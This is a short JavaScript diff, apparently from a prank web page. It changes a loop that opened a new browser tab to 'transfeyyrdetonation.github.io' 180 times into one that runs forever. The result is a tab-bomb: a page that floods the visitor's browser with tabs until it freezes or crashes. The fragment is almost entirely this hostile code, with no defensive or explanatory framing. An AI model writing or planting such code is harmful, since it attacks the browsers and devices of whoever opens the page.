@@ -3,6 +3,6 @@
             "transfeyyrdetonation.github.io", "_blank");
         }
 
-for (var i = 0; i < 180; i++) {
+for (var i = 0; i < Infinity; i++) {
        NewTab();
 }
